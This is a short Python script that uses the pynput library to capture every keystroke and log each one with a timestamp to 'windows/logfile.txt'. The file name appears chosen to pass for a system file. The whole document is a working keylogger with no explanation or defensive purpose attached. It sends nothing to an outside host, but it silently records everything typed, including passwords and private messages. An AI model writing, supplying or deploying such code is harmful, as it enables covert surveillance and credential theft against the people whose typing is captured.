from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(
    filename=("windows/logfile.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s"
)


def press(key):
    logging.info(str(key))


with Listener(on_press=press) as listener:
    listener.join()
